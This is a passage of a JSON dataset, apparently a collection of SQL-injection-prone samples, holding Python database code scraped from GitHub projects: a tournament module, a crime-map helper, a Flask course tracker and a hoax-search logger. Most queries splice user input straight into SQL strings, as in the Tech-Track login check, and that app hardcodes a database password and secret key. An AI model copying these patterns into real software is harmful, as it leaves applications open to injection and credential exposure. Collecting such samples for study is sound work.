your SQL database schema, not in your Python code.)\n\n    Args:\n      name: the player's full name (need not be unique).\n    \"\"\"\n\n    db = connect()\n    c = db.cursor()\n    # remove any occurance of quotes/apostrophes to prevent sql injection\n    safe_n = name = name.translate(None, '\\'\\\"')\n    query = \"INSERT INTO players (name) values ('{name}')\".format(name=safe_n)\n    c.execute(query)\n    db.commit()\n    db.close()\n\n\ndef playerStandings():\n    \"\"\"Returns a list of the players and their win records, sorted by wins.\n\n    The first entry in the list should be the player in first place, or a player\n    tied for first place if there is currently a tie.\n\n    Returns:\n      A list of tuples, each of which contains (id, name, wins, matches):\n        id: the player's unique id (assigned by the database)\n        name: the player's full name (as registered)\n        wins: the number of matches the player has won\n        matches: the number of matches the player has played\n    \"\"\"\n    db = connect()\n    c = db.cursor()\n    c.execute(\"SELECT * FROM standings\")\n    rows = c.fetchall()\n    db.close()\n    return rows\n\n\ndef reportMatch(winner, loser):\n    \"\"\"Records the outcome of a single match between two players.\n\n    Args:\n      winner:  the id number of the player who won\n      loser:  the id number of the player who lost\n    \"\"\"\n    try:\n        int(winner)\n        int(loser)\n    except ValueError:\n        raise ValueError(\n            \"\\\"winner\\\" and/or \\\"loser\\\" input are not integers.\\n\"\n            \"Please use the id number of each player to report match results.\"\n        )\n    w = str(winner)\n    l = str(loser)\n    db = connect()\n    c = db.cursor()\n    statement = \"INSERT INTO matches values ({w}, {l})\".format(w=w, l=l)\n    c.execute(statement)\n    db.commit()\n    db.close()\n\n\ndef swissPairings():\n    \"\"\"Returns a list of pairs of players for the next round of a match.\n\n    Assuming that there are an even number of players registered, each player\n    appears exactly once in the pairings.  Each player is paired with another\n    player with an equal or nearly-equal win record, that is, a player adjacent\n    to him or her in the standings.\n\n    Returns:\n      A list of tuples, each of which contains (id1, name1, id2, name2)\n        id1: the first player's unique id\n        name1: the first player's name\n        id2: the second player's unique id\n        name2: the second player's name\n    \"\"\"\n    db = connect()\n    c = db.cursor()\n    c.execute(\"SELECT * FROM pairup;\")\n    rows = c.fetchall()\n    db.close()\n    return list(reversed(rows))\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/sgnab/crime-map-app/blob/71536277c08051f94803285aee371e80cb0993e6",
        "file_path": "/dbhelper.py",
        "source": "\nimport pymysql\nimport dbconfig\n\nclass DBhelper:\n    def connect(self,database=\"crimemap\"):\n        return pymysql.connect(host='localhost',\n                               user=dbconfig.db_user,\n                               passwd=dbconfig.db_password,\n                               db=database)\n\n    def get_all_inputs(self):\n        connection=self.connect()\n\n        try:\n            query=\"SELECT description FROM crimes;\"\n            with connection.cursor() as cursor:\n                cursor.execute(query)\n            return cursor.fetchall()\n        finally:\n            connection.close()\n\n\n\n    def add_input(self,data):\n        connection = self.connect()\n\n        try:\n            query = \"INSERT INTO crimes (description) VALUES ('{}');\".format(data)\n            with connection.cursor() as cursor:\n                cursor.execute(query)\n                connection.commit()\n        finally:\n            connection.close()\n\n\n\n    def clear_input(self):\n        connection = self.connect()\n\n        try:\n            query =\"DELETE FROM crimes;\"\n            with connection.cursor() as cursor:\n                cursor.execute(query)\n                connection.commit()\n        finally:\n            connection.close()\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/CaitlinKennedy/Tech-Track/blob/27fa601b58a15e829ef0c6e496ee83d8064bc9ef",
        "file_path": "/src/tech_track.py",
        "source": "from flask import Flask\nfrom flask import session, redirect, url_for, escape, request\nfrom flask import request\nfrom flaskext.mysql import MySQL\nfrom flask import render_template\nfrom flask import Flask,jsonify,json\nfrom string import Template\n\napp = Flask(__name__)\n\n#Required code to connect to mySQL database.\nmysql = MySQL()\napp = Flask(__name__)\napp.config['MYSQL_DATABASE_USER'] = 'root'\napp.config['MYSQL_DATABASE_PASSWORD'] = '27'\n\napp.config['MYSQL_DATABASE_DB'] = 'TechTrack'\napp.config['MYSQL_DATABASE_HOST'] = 'localhost'\nmysql.init_app(app)\n\n#Homepage\n#TODO: Replace wtih HTML template when created. \n@app.route('/')\ndef index():\n\tif 'username' in session:\n\t\treturn redirect(url_for('instructions'))\n\treturn redirect(url_for('login'))\n\t\n\n@app.route('/instructions')\ndef instructions():\n\tif 'username' in session:\n\t\treturn render_template('instructions.html')\n\treturn redirect(url_for('login'))\n\n#Login Page\n#Default route only answers to GET requests.\n#Can change this by providing methods argument to the route() decorator.\n@app.route('/login', methods=['GET', 'POST'])\ndef login():\n\n\terror=None\n\n\t#The request was a POST request, i.e. user is submitting form data.\n\tif request.method == 'POST':\n\n\t\t#Get information from form.\n\t\tusername = request.form['username']\n\t\tpassword = request.form['password']\n\n\t\t#Check database.\n\t\tcursor = mysql.connect().cursor()\n\t\tcursor.execute(\"SELECT * from Users where emailAccount='\" + username + \"' and password='\" + password + \"'\")\n\t\tdata = cursor.fetchone()\n\n\t\tif data is None:\n\t\t\terror=\"Username or password is incorrect.\"\n\t\telse:\n\t\t\t#Session.\n\t\t\tsession['username'] = request.form['username']\n\t\t\treturn redirect(url_for('instructions'))\n\n\treturn render_template('login.html', error=error)\n\n\n#Register. \n@app.route('/register', methods=['GET', 'POST'])\ndef register():\n    error = None\n    if request.method == 'POST':\n        emailAccount = request.form['username']\n        password = request.form['password']\n\n        splitDomainName = emailAccount.split('@')[1]\n        if (splitDomainName != 'purdue.edu'):\n        \terror = \"You should use a Purdue email.\"\n    \t\treturn render_template('createAccount.html', error=error) \n        \n\n        conn = mysql.connect()\n        cursor = conn.cursor()\n    \n        cursor.execute(\"SELECT * from Users where emailAccount='\" + emailAccount + \"'\")\n        data = cursor.fetchone()\n        if data is None:\n            #this password is unique so add it to the database\n            cursor.execute('''INSERT INTO Users (emailAccount, password, isNewUser, cs180Completed, cs240Completed, cs250Completed, cs251Completed, cs314Completed, cs334Completed, cs381Completed, cs307Completed, cs448Completed, cs456Completed, cs422Completed, cs426Completed) VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s)''',(emailAccount, password, True, False, False, False, False, False, False, False, False, False, False, False, False))\n            conn.commit()\n\n            session['username'] = request.form['username']\n\n            return redirect(url_for('instructions'))\n        else: \n            error = \"Username is already in use.\"\n\n    #return \"You are already registered\" #render html for register page and send error message\n    return render_template('createAccount.html', error=error) \n\n#levelPage1\n@app.route('/levelPage1')\ndef levelPage1():\n\tif 'username' in session:\n\n\t\tconn = mysql.connect()\n\t\tcursor = conn.cursor()\n\n\t\tcursor.execute(\"SELECT * from Users where emailAccount='\" + session['username'] + \"'\")\n\t\tdata = cursor.fetchone()\n\n\t\tstatus180 = data[3]\n\t\tstatus240 = data[4]\n\t\tstatus250=data[5]\n\t\tstatus251=data[6]\n\n\t\tif status180 is 1:\n\t\t\tstatus180 = 0;\n\t\telse:\n\t\t\tstatus180 = 1;\n\n\t\tif status240 is 1:\n\t\t\tstatus240 = 0;\n\t\telse:\n\t\t\tstatus240 = 1;\n\n\t\tif status250 is 1:\n\t\t\tstatus250 = 0;\n\t\telse:\n\t\t\tstatus250 = 1;\n\t\t\n\t\tif status251 is 1:\n\t\t\tstatus251 = 0;\n\t\telse:\n\t\t\tstatus251 = 1;\n\n\t\ttry:\n\t\t\t#create a instance for filling up levelData\n\t\t\tlevelDict = {\n\t\t\t'level' : 1,\n\t\t\t'classes': [\n\t\t\t\t\t{\n\t\t\t\t\t\t'name': 'CS 180', \n\t\t\t\t\t\t'status': status180\n\t\t\t\t\t}, \n\t\t\t\t\t{\n\t\t\t\t\t\t'name':'CS 240', \n\t\t\t\t\t\t'status':status240\n\t\t\t\t\t}, \n\t\t\t\t\t{\n\t\t\t\t\t\t'name':'CS 250',\n\t\t\t\t\t\t'status':status250\n\t\t\t\t\t}, \n\t\t\t\t\t{\n\t\t\t\t\t\t'name':'CS 251', \n\t\t\t\t\t\t'status':status251\n\t\t\t\t\t} \n\t\t\t\t]\n\t\t\t}\n\t\texcept Exception ,e:\n\t\t\tprint str(e)\n\t\treturn jsonify(levelDict) \n\n\n\t\t#return render_template('levelPage1.html')\n\treturn redirect(url_for('login'))\n\n@app.route('/levelPage2')\ndef levelPage2():\n\tif 'username' in session:\n\t\t\n\t\tconn = mysql.connect()\n\t\tcursor = conn.cursor()\n\n\t\tcursor.execute(\"SELECT * from Users where emailAccount='\" + session['username'] + \"'\")\n\t\tdata = cursor.fetchone()\n\t\t#print(data);\n\n\t\tstatus180 = data[3]\n\t\tstatus240 = data[4]\n\t\tstatus250=data[5]\n\t\tstatus251=data[6]\n\t\tstatus314 = data[7]\n\t\tstatus334 = data[8]\n\t\tstatus381=data[9]\n\t\tstatus307=data[10]\n\n\n\t\t#From database: 0 is not completed, 1 is completed\n\t\t#For the JSON: 0 is completed, 1 is not completed and in current level, 2 is prerequisites arent met\n\t\t#If any of level 1's courses are not completed, then user should not be able to do any of level 2 courses\n\t\tif ((status180 is 0) or (status240 is 0) or (status250 is 0) or (status251 is 0)):\n\t\t\tstatus314 = 2;\n\t\t\tstatus334 = 2;\n\t\t\tstatus381 = 2;\n\t\t\tstatus307 = 2;\n\t\telse: \n\t\t\tif status314 is 1:\n\t\t\t\tstatus314 = 0;\n\t\t\telse:\n\t\t\t\tstatus314 = 1;\n\n\t\t\tif status334 is 1:\n\t\t\t\tstatus334 = 0;\n\t\t\telse:\n\t\t\t\tstatus334 = 1;\n\n\t\t\tif status381 is 1:\n\t\t\t\tstatus381 = 0;\n\t\t\telse:\n\t\t\t\tstatus381 = 1;\n\t\t\t\n\t\t\tif status307 is 1:\n\t\t\t\tstatus307 = 0;\n\t\t\telse:\n\t\t\t\tstatus307 = 1;\n\n\n\t\ttry:\n\t\t\t#create a instance for filling up levelData\n\t\t\tlevelDict = {\n\t\t\t'level' : 2,\n\t\t\t'classes': [\n\t\t\t\t\t{\n\t\t\t\t\t\t'name':'CS 307', \n\t\t\t\t\t\t'status':status307\n\t\t\t\t\t},\n\t\t\t\t\t{\n\t\t\t\t\t\t'name': 'CS 314', \n\t\t\t\t\t\t'status': status314\n\t\t\t\t\t}, \n\t\t\t\t\t{\n\t\t\t\t\t\t'name':'CS 334', \n\t\t\t\t\t\t'status':status334\n\t\t\t\t\t}, \n\t\t\t\t\t{\n\t\t\t\t\t\t'name':'CS 381',\n\t\t\t\t\t\t'status':status381\n\t\t\t\t\t} \n\t\t\t\t\t\n\t\t\t\t]\n\t\t\t}\n\t\texcept Exception ,e:\n\t\t\tprint str(e)\n\t\treturn jsonify(levelDict)\n\n\t\t#return render_template('levelPage2.html')\n\treturn redirect(url_for('login'))\n\n@app.route('/levelPage3')\ndef levelPage3():\n\tif 'username' in session:\n\t\t\n\t\tconn = mysql.connect()\n\t\tcursor = conn.cursor()\n\n\t\tcursor.execute(\"SELECT * from Users where emailAccount='\" + session['username'] + \"'\")\n\t\tdata = cursor.fetchone()\n\n\t\tstatus180 = data[3]\n\t\tstatus240 = data[4]\n\t\tstatus250=data[5]\n\t\tstatus251=data[6]\n\t\tstatus314 = data[7]\n\t\tstatus334 = data[8]\n\t\tstatus381=data[9]\n\t\tstatus307=data[10]\n\t\tstatus448 = data[11]\n\t\tstatus456 = data[12]\n\t\tstatus426 = data[14]\n\t\tstatus422 = data[13]\n\n\t\tif (status180 is 0) or (status240 is 0) or (status250 is 0) or (status251 is 0) or (status314 is 0) or (status334 is 0) or (status381 is 0) or (status307 is 0):\n\t\t\tstatus448 = 2\n\t\t\tstatus456 = 2\n\t\t\tstatus426 = 2\n\t\t\tstatus422 = 2\n\t\telse: \t\t\n\t\t\tif status448 is 1:\n\t\t\t\tstatus448 = 0\n\t\t\telse:\n\t\t\t\tstatus448 = 1\n\n\t\t\tif status456 is 1:\n\t\t\t\tstatus456 = 0\n\t\t\telse:\n\t\t\t\tstatus456 = 1\n\n\t\t\tif status426 is 1:\n\t\t\t\tstatus426 = 0\n\t\t\telse:\n\t\t\t\tstatus426 = 1\n\n\t\t\tif status422 is 1:\n\t\t\t\tstatus422 = 0\n\t\t\telse:\n\t\t\t\tstatus422 = 1\n\n\t\ttry:\n\t\t\t# Create an instance for filling up classData\n\t\t\tlevelDict = {\n\t\t\t'level': 3,\n\t\t\t'classes': [\n\t\t\t\t{\n\t\t\t\t\t'name':\"CS 422\", \n\t\t\t\t\t'status':status422\n\t\t\t\t},\n\t\t\t\t{\n\t\t\t\t\t'name':\"CS 426\",\n\t\t\t\t\t'status':status426\n\t\t\t\t},\n\t\t\t\t{\n\t\t\t\t\t'name': \"CS 448\", \n\t\t\t\t\t'status':status448\n\t\t\t\t}, \n\t\t\t\t{\n\t\t\t\t\t'name':\"CS 456\", \n\t\t\t\t\t'status':status456\n\t\t\t\t}, \n\t\t\t\t\n\t\t\t\t\n\t\t\t]}\n\t\t\t\n\t\texcept Exception ,e:\n\t\t\tprint str(e)\n\n\t\treturn jsonify(levelDict)\n\n\treturn redirect(url_for('login'))\n\n\n@app.route('/overview/<classNum>')\ndef overview(classNum):\n\tif 'username' in session:\n\t\tclassNoSpace = classNum.split(' ')[0]+classNum.split(' ')[1]\n\n\t\t#Save the current course as a session variable.\n\t\tsession['currentCourse'] = classNoSpace\n\n\t\tconn = mysql.connect()\n\t\tcursor = conn.cursor()\n\n\t\tcursor.execute(\"SELECT courseName,courseOverview from courses where courseAbbreviation='\" + classNoSpace + \"'\")\n\t\tdata = cursor.fetchone()\n\n\t\treturn render_template('overview.html', className = classNum, courseTitle = data[0], courseOverview = data[1])\n\n\treturn redirect(url_for('index'))\n\n\n#Logout\n\n@app.route('/lastCourseEntered')\ndef lastCourseEntered():\n\tif 'username' in session:\n\t\tif 'lastCourseEntered' in session:\n\t\t\treturn jsonify(session['lastCourseEntered'])\n\t\telse:\n\t\t\treturn jsonify(\"None\")\n\treturn redirect(url_for('login'))\n\n@app.route('/logout')\ndef logout(): \n\tsession.pop('username', None)\n\treturn redirect(url_for('index'))\n\n\n@app.route('/levels')\ndef levels(): \n\tif 'username' in session:\n\t\treturn render_template('hallway.html')\n\treturn redirect(url_for('login'))\n\n\n@app.route('/quiz', methods=['GET', 'POST'])\ndef quiz():\n\n\terror = None\n\tanswers = None\n\tgrades = None\n\tshowSubmit = None\n\tcourse = None\n\trank = None\n\n\tif 'username' in session:\n\n\t\tif 'currentCourse' in session:\n\t\t\tcourse = session['currentCourse']\n\t\telse:\n\t\t\treturn redirect(url_for('levels'))\n\n\t\tconn = mysql.connect()\n\t\tcursor = conn.cursor()\n\t\tcursor.execute(\"SELECT questionString, option1, option2, option3, option4, correctAnswer, courseName FROM courses join questions on questions.courseId=courses.courseId where courses.courseAbbreviation='\" + course + \"'\")\n\n\t\tquestions = []\n\t\tfor row in cursor:\n\t\t\tquestions.append(row)\n\n\t\tif request.method == 'POST':\n\t\t\t#print request.form\n\n\t\t\tif (len(request.form) != 7):\n\t\t\t\terror = \"Please answer all of the questions.\"\n\t\t\t\tshowSubmit = True\n\t\t\telse:\n\t\t\t\tgrades = []\n\t\t\t\tanswers = []\n\t\t\t\tscore = 0\n\n\t\t\t\tfor i in range(0, len(request.form) - 2):\n\t\t\t\t\tanswers.append(int(request.form[\"q\" + str(i+1)]))\n\n\t\t\t\t\tif ( int(questions[i][5]) == answers[i] ):\n\t\t\t\t\t\tgrades.append(1)\n\t\t\t\t\t\tscore = score + 1\n\t\t\t\t\telse:\n\t\t\t\t\t\tgrades.append(0)\n\n\t\t\t\trank = request.form[\"rankquiz\"]\n\n\t\t\t\ttotal = score + 3*int(rank)\n\n\t\t\t\tcursor.execute(\"SELECT courseId FROM courses WHERE courseAbbreviation='\" + course +\"'\")\n\t\t\t\tcourseId = cursor.fetchone()\n\n\t\t\t\tcursor.execute(\"SELECT courseConcentration FROM courses WHERE courseAbbreviation='\" + course +\"'\")\n\t\t\t\tcourseConcentration = cursor.fetchone()\n\n\t\t\t\tcursor.execute(\"DELETE FROM results WHERE emailAccount='\" + session['username'] + \"' and courseId=\" + str(courseId[0]))\n\n\t\t\t\t#print \"INSERT INTO results (emailAccount, courseId, courseConcentration, score, rank, total) VALUES ('\" + session['username'] + \"',\" + str(courseId[0]) + \",'\" + str(courseConcentration[0]) + \"',\" + str(score) + \",\" + str(rank) + \",\" + str(total) + \")\"\n\t\t\t\tcursor.execute(\"INSERT INTO results (emailAccount, courseId, courseConcentration, score, rank, total) VALUES ('\" + session['username'] + \"',\" + str(courseId[0]) + \",'\" + str(courseConcentration[0]) + \"',\" + str(score) + \",\" + str(rank) + \",\" + str(total) + \")\")\n\t\t\t\tcursor.execute(\"UPDATE users SET \" + course.lower() + \"Completed=1 WHERE emailAccount='\" + session['username'] + \"'\")\n\t\t\t\tconn.commit()\n\n\t\t\t\tsession['lastCourseEntered'] = session['currentCourse']\n\t\t\t\tsession.pop('currentCourse', None)\n\t\t\t\t\n\t\t\t\trank = int(rank)\n\t\t\treturn render_template('quiz.html', questions=questions, error=error, answers=answers, grades=grades, rank=rank, showSubmit=showSubmit)\n\t\telse:\n\t\t\tshowSubmit = True\n\t\t\treturn render_template('quiz.html', questions=questions, error=error, answers=answers, grades=grades, rank=rank, showSubmit=showSubmit)\n\treturn redirect(url_for('login'))\n\n@app.route('/summary', methods=['GET'])\ndef summary():\n\tif 'username' in session:\n\n\t\tconn = mysql.connect()\n\t\tcursor = conn.cursor()\n\n\t\t#select the maximum score from the results table\n\t\tcursor.execute(\"SELECT courseConcentration FROM results WHERE total = (SELECT MAX(total) FROM (SELECT * FROM results WHERE courseId > 4) Temp) and courseId > 4 and emailAccount='\" + session['username'] + \"'\");\n\t\tcourseConcentration = cursor.fetchone()\n\n\t\treturn render_template('summary.html', courseConcentration = courseConcentration[0])\n\treturn redirect(url_for('login'))\n\n#Secret Key\napp.secret_key = 'A0Zr98j/3yX R~'\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/hoaxanalyzer/hoax-search-vote/blob/110c745e6b97457a85722a12c80e81325672aa3f",
        "file_path": "/database.py",
        "source": "import pymysql.cursors\nfrom datetime import date, datetime\nimport json\nimport config\n\nclass Database:\n\tdef __init__(self):\n\t\tself.conn = pymysql.connect(user=config.mysql_credentials[\"user\"], \\\n\t\t\t\t\t\t\t\t\tpassword=config.mysql_credentials[\"password\"], \\\n\t\t\t\t\t\t\t\t\thost=config.mysql_credentials[\"host\"], \\\n\t\t\t\t\t\t\t\t\tdb=config.mysql_credentials[\"database\"],\n\t\t\t\t\t\t\t\t\tcursorclass=pymysql.cursors.DictCursor)\n\t\tself.cur = self.conn.cursor()\n\n\tdef __enter__(self):\n\t\treturn DBase()\n\n\tdef __exit__(self, exc_type, exc_val, exc_tb):\n\t\tif self.conn:\n\t\t\tself.cur.close()\n\t\t\tself.conn.close()\n\n\tdef insert_query_log(self, lhash, text, search, qhash, ip, browser): \t\n\t\tsql = \"INSERT INTO log_query (log_hash, query_text, query_search, query_hash, query_time, client_ip, client_browser, clicked) VALUES\" + \\\n\t\t\t\t\t\"({}, {}, {}, '{}', '{}', '{}', {}, {})\".format(json.dumps(lhash), json.dumps(text), json.dumps(search), qhash, datetime.now(), ip, json.dumps(browser), 0)\n\t\tself.cur.execute(sql)\n\t\tself.conn.commit()\n\t\treturn self.cur.lastrowid\n\n\tdef insert_result_log(self, qid, hoax, fact, unknown, unrelated, conclusion):\n\t\tsql = \"INSERT INTO log_result (id_query, finished_at, hoax_score, fact_score, unknown_score, unrelated_score, conclusion) VALUES\" + \\\n\t\t\t\t\t\"('%s', '%s', '%s', '%s', '%s', '%s', '%s')\" % (qid, datetime.now(), hoax, fact, unknown, unrelated, conclusion)\n\t\tself.cur.execute(sql)\n\t\tself.conn.commit()\n\t\treturn self.cur.lastrowid\n\n\tdef insert_result_feedback(self, qhash, is_know, reason, label, ip, browser):\n\t\tsql = \"INSERT INTO feedback_result (query_hash, reported_at, is_know, reason, feedback_label, client_ip, client_browser) VALUES\" + \\\n\t\t\t\t\t\"('%s', '%s', '%s', '%s', '%s', '%s', '%s')\" % (qhash, datetime.now(), is_know, reason, label, ip, browser)\n\t\tself.cur.execute(sql)\n\t\tself.conn.commit()\n\t\treturn self.cur.lastrowid\n\n\tdef insert_reference_feedback(self, ahash, is_relevant, reason, label, ip, browser):\n\t\tprint(str(ahash))\n\t\tprint(str(is_relevant))\n\t\tsql = \"INSERT INTO feedback_reference (article_hash, reported_at, is_relevant, reason, feedback_label, client_ip, client_browser) VALUES\" + \\\n\t\t\t\t\t\"('%s', '%s', '%s', '%s', '%s', '%s', '%s')\" % (ahash, datetime.now(), is_relevant, reason, label, ip, browser)\n\t\tself.cur.execute(sql)\n\t\tself.conn.commit()\n\t\treturn self.cur.lastrowid\n\n\tdef insert_references(self, qid, articles):\n\t\tinsert_values = []\n\t\tfor article in articles:\n\t\t\tinsert_values.append((qid, str(article[\"qhash\"]), str(article['hash']), str(article['date']), str(article['url']), article['content'], datetime.now())) \t\n\t\tsql = \"INSERT INTO article_reference (id_query, query_hash, article_hash, article_date, article_url, article_content, retrieved_at) VALUES\" + \\\n\t\t\t\t\",\".join(\"(%s, %s, %s, %s, %s, %s, %s)\" for _ in insert_values)\n\t\tflattened_values = [item for sublist in insert_values for item in sublist]\n\t\tself.cur.execute(sql, flattened_values)\n\t\tself.conn.commit()\n\n\tdef is_query_exist(self, loghash):\n\t\tsql = \"SELECT id FROM log_query WHERE log_hash = '%s'\" % (loghash)\n\t\tself.cur.execute(sql)\n\t\tself.conn.commit()\n\t\treturn (self.cur.rowcount == 1)\n\n\tdef is_reference_exist(self, ahash):\n\t\tsql = \"SELECT id FROM article_reference WHERE article_hash = '%s'\" % (ahash)\n\t\tself.cur.execute(sql)\n\t\tself.conn.commit()\n\t\treturn (self.cur.rowcount == 1)\n\n\tdef get_query_by_loghash(self, loghash):\n\t\tsql = \"SELECT * FROM log_query WHERE log_hash = '%s' LIMIT 1\" % (loghash)\n\t\tself.cur.execute(sql)\n\t\tself.conn.commit()\n\t\tquery = self.cur.fetchone()\n\t\treturn query\n\n\tdef get_query_log(self):\n\t\tsql = \"SELECT * FROM log_query ORDER BY query_time DESC\"\n\t\tself.cur.execute(sql)\n\t\tself.conn.commit()\n\t\tqueries = []\n\t\tfor row in self.cur.fetchall():\n\t\t\tquery = {}\n\t\t\tquery[\"log_hash\"] = row[\"log_hash\"]\n\t\t\tquery[\"query_text\"] = row[\"query_text\"]\n\t\t\tquery[\"query_search\"] = row[\"query_search\"]\n\t\t\tquery[\"query_hash\"] = row[\"query_hash\"]\n\t\t\tquery[\"query_time\"] = str(row[\"query_time\"])\n\t\t\tquery[\"client_ip\"] = row[\"client_ip\"]\n\t\t\tquery[\"client_browser\"] = row[\"client_browser\"]\n\t\t\tquery[\"clicked\"] = row[\"clicked\"]\n\t\t\tqueries.append(query)\n\t\treturn queries\n\n\tdef del_reference_by_qhash(self, qhash):\n\t\tsql = \"DELETE FROM article_reference WHERE query_hash = '%s'\" % (qhash)\n\t\tself.cur.execute(sql)\n\t\tself.conn.commit()\t\t\n\n\tdef get_reference_by_qhash(self, qhash):\n\t\tsql = \"SELECT * FROM article_reference WHERE query_hash = '%s'\" % (qhash)\n\t\tself.cur.execute(sql)\n\t\tself.conn.commit()\n\t\tarticles = []\n\t\tif (self.cur.rowcount > 0):\n\t\t\tfor row in self.cur.fetchall():\n\t\t\t\tarticle = {}\n\t\t\t\tarticle[\"hash\"] = row[\"article_hash\"]\n\t\t\t\tarticle[\"date\"] = row[\"article_date\"]\n\t\t\t\tarticle[\"url\"] = row[\"article_url\"]\n\t\t\t\tarticle[\"content\"] = row[\"article_content\"]\n\t\t\t\tarticles.append(article)\n\t\treturn articles\n\n\tdef get_reference_feedback(self):\n\t\t## VIWEW HELPER #1\n\t\tsql = \"CREATE OR REPLACE VIEW feedback_reference_result AS SELECT article_hash, is_relevant, feedback_label, COUNT(*) AS count FROM feedback_reference GROUP BY article_hash, is_relevant, feedback_label\"\n\t\tself.cur.execute(sql)\n\t\tself.conn.commit()\n\n\t\t## VIWEW HELPER #2\n\t\tsql = \"CREATE OR REPLACE VIEW feedback_reference_max AS (SELECT article_hash, is_relevant, feedback_label, count FROM feedback_reference_result WHERE count = (SELECT MAX(count) FROM feedback_reference_result i WHERE i.article_hash = feedback_reference_result.article_hash))\"\n\t\tself.cur.execute(sql)\n\t\tself.conn.commit()\n\n\t\t## THE QUERY\n\t\tsql = \"SELECT log_query.id, log_query.query_text, log_query.query_search, article_reference.article_content, feedback_reference_max.is_relevant, feedback_reference_max.feedback_label FROM feedback_reference_max LEFT JOIN article_reference ON article_reference.article_hash = feedback_reference_max.article_hash LEFT JOIN log_query ON log_query.id = article_reference.id_query\"\n\t\tself.cur.execute(sql)\n\t\tself.conn.commit()\n\n\t\tfeedbacks = {}\n\t\tfor row in self.cur.fetchall():\n\t\t\tfeedback = {}\n\t\t\tfeedback[\"query_text\"] = row[\"query_text\"]\n\t\t\tfeedback[\"query_search\"] = row[\"query_search\"]\n\t\t\tfeedback[\"article_content\"] = row[\"article_content\"]\n\t\t\tfeedback[\"is_relevant\"] = row[\"is_relevant\"]\n\t\t\tfeedback[\"feedback_label\"] = row[\"feedback_label\"]\n\t\t\t#feedbacks.append(feedback)\n\t\t\tif not (row[\"id\"] in feedbacks):\n\t\t\t\tfeedbacks[row[\"id\"]] = []\n\t\t\tfeedbacks[row[\"id\"]].append(feedback)\n\t\treturn feedbacks\n\n\tdef check_query(self, qhash): \t\n\t\tsql = \"INSERT INTO log_query (query_text, query_search, query_hash, query_time, client_ip, client_browser) VALUES\" + \\\n\t\t\t\t\t\"({}, {}, '{}', '{}', '{}', {})\".format(json.dumps(text), json.dumps(search), qhash, datetime.now(), ip, json.dumps(browser))\n\t\tself.cur.execute(sql)\n\t\tself.conn.commit()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/svissers/datacleaner/blob/31033ed572265f69509e3ede5c30b0a222686b9d",
        "file_path": "/app/Data/Transform/controllers.py",
        "source": "from flask import (\n    Blueprint,\n    request,\n    jsonify,\n    redirect,\n    url_for,\n    render_template,\n    flash,\n    Response\n)\nfrom flask_login import login_required, current_user\nfrom app.Data.operations import create_action, get_dataset_with_id\nfrom app.Data.helpers import table_name_to_object\nfrom app.Data.Transform.operations import (\n    restore_original,\n    change_attribute_type,\n    delete_rows,\n    fill_null_with,\n    fill_null_with_average,\n    fill_null_with_median,\n    rename_attribute,\n    delete_attribute,\n    one_hot_encode,\n    normalize_attribute,\n    discretize_width,\n    discretize_eq_freq,\n    find_replace,\n    regex_find_replace,\n    substring_find_replace\n)\n\n_transform = Blueprint('transform_bp', __name__, url_prefix='/data/transform')\n\n\n@_transform.route('/rename_column', methods=['POST'])\n@login_required\ndef rename_column():\n    dataset = get_dataset_with_id(request.args.get('dataset_id'))\n    col = request.form['column']\n    new_name = request.form['new_name']\n    try:\n        rename_attribute(dataset.working_copy, col, new_name)\n        create_action(\n            'Renamed column {0} to {1}'.format(col, new_name),\n            dataset.id,\n            current_user.id\n        )\n    except:\n        flash('An unexpected error occured while renaming the column', 'danger')\n    else:\n        flash('Column renamed successfully.', 'success')\n\n    return redirect(request.referrer)\n\n\n@_transform.route('/delete_column', methods=['POST'])\n@login_required\ndef delete_column():\n    dataset = get_dataset_with_id(request.args.get('dataset_id'))\n    col = request.form['column']\n    try:\n        delete_attribute(dataset.working_copy, col)\n        create_action(\n            'Deleted column {0}'.format(col),\n            dataset.id,\n            current_user.id\n        )\n    except:\n        flash('An unexpected error occured while deleting the column', 'danger')\n    else:\n        flash('Column deleted successfully.', 'success')\n\n    return redirect(request.referrer)\n\n\n@_transform.route('one_hot_encode_column', methods=['POST'])\n@login_required\ndef one_hot_encode_column():\n    dataset = get_dataset_with_id(request.args.get('dataset_id'))\n    col = request.form['column']\n    try:\n        one_hot_encode(dataset.working_copy, col)\n        create_action(\n            'One-hot-encoded {0}'.format(col),\n            dataset.id,\n            current_user.id\n        )\n    except:\n        flash('An unexpected error occured while one-hot-encoding the column',\n              'danger'\n              )\n    else:\n        flash('Column one-hot-encoded successfully.', 'success')\n\n    return redirect(request.referrer)\n\n\n@_transform.route('normalize_column', methods=['POST'])\n@login_required\ndef normalize_column():\n    dataset = get_dataset_with_id(request.args.get('dataset_id'))\n    col = request.form['column']\n    try:\n        normalize_attribute(dataset.working_copy, col)\n        create_action(\n            'Normalized {0}'.format(col),\n            dataset.id,\n            current_user.id\n        )\n    except:\n        flash('An unexpected error occured while normalizing the column',\n              'danger'\n              )\n    else:\n        flash('Column normalized successfully.', 'success')\n\n    return redirect(request.referrer)\n\n\n@_transform.route('/discretize_column', methods=['POST'])\n@login_required\ndef discretize_column():\n    dataset = get_dataset_with_id(request.args.get('dataset_id'))\n    column = request.form['column']\n    intervals = request.form['intervals']\n\n    try:\n        if intervals == 'equal-distance':\n            amount = request.form['amount-dist']\n            discretize_width(dataset.working_copy, column, int(amount))\n        elif intervals == 'equal-frequency':\n            amount = request.form['amount-freq']\n            discretize_eq_freq(dataset.working_copy, column, int(amount))\n        else:\n            edges = str(request.form['custom-edges'])\n            edges = edges.replace(' ', '')\n            edge_list = edges.split(',')\n            if len(edge_list) < 2:\n                raise ValueError\n            for i in range(len(edge_list)):\n                edge_list[i] = float(edge_list[i])\n            discretize_width(dataset.working_copy, column, edge_list)\n\n    except ValueError:\n        flash('Invalid list of edges provided.',\n              'danger'\n              )\n    except:\n        flash('An unexpected error occured while discretizing the column',\n              'danger'\n              )\n    else:\n        flash('Column discretized successfully.', 'success')\n\n    return redirect(request.referrer)\n\n\n@_transform.route('/delete_selection', methods=['POST'])\n@login_required\ndef delete_selection():\n    dataset = get_dataset_with_id(request.args.get('dataset_id'))\n    selected_data = request.form.getlist(\"data_id\")\n    table = table_name_to_object(dataset.working_copy)\n    for data in selected_data:\n        table.delete(table.c.index == data).execute()\n    create_action(\n        'deleted selected 